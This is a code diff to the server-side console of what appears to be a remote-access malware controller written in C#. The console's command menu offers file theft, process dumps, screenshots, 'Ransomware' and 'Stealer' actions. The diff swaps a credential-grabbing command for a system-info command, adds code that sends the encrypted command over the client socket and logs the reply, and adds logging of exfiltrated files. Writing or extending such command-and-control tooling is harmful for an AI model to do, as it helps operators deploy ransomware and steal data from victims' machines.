@@ -40,8 +40,8 @@ namespace Server_side
 
             cmdComboBox.Items.Clear();
             cmdComboBox.Items.Add("Get File");
-            cmdComboBox.Items.Add("Get Credential");
-            cmdComboBox.Items.Add("Get Process Dump");
+            cmdComboBox.Items.Add("Get SystemInfo");
+            cmdComboBox.Items.Add("Get ProcessDump");
             cmdComboBox.Items.Add("Get Screenshot");
             cmdComboBox.Items.Add("Ransomware");
             cmdComboBox.Items.Add("Stealer");
@@ -119,6 +119,12 @@ namespace Server_side
             agentLogBox.SelectionStart = agentLogBox.TextLength;
             agentLogBox.SelectionLength = log.Length - boldText.Length;
             agentLogBox.SelectionColor = Color.Black;
+
+            if (boldText.Contains("received"))
+            {
+                agentLogBox.AppendText(Environment.NewLine);
+            }
+
             agentLogBox.AppendText(parts[1] + Environment.NewLine);
         }
 
@@ -157,7 +163,18 @@ namespace Server_side
                     }
                 case 1:
                     {
-                        placeholder = "getcredential";
+                        placeholder = "getsysteminfo";
+
+                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
+                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
+                        NetworkLayer.Send(clientSocket, encryptedCommand);
+
+                        logging("Command sent|---|" + cmdComboBox.Text);
+
+                        // Receive response
+                        byte[] response = GetResultFile(false);
+                        logging("Response received|---|" + Encoding.UTF8.GetString(response));
+
 
                         break;
                     }
@@ -262,6 +279,8 @@ namespace Server_side
             string guid = parts[0];
             int chunkCount = int.Parse(parts[1]);
             string fileName = parts[2];
+
+            logging($"File received|---|{fileName}_{guid}_{chunkCount}");
 
             string fileBase64 = "";
             for (int i = 0; i < chunkCount; i++)
